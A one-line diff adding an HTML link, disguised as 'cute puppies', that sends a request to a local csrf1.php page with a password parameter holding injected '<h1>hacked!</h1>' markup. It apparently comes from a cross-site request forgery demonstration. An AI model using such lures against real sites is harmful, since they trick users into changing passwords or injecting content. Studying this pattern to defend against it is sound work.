@@ -1,0 +1,1 @@
+<a href="./csrf1.php?password=<h1>hacked!</h1>">Click here to see cute puppies!!!!</a>
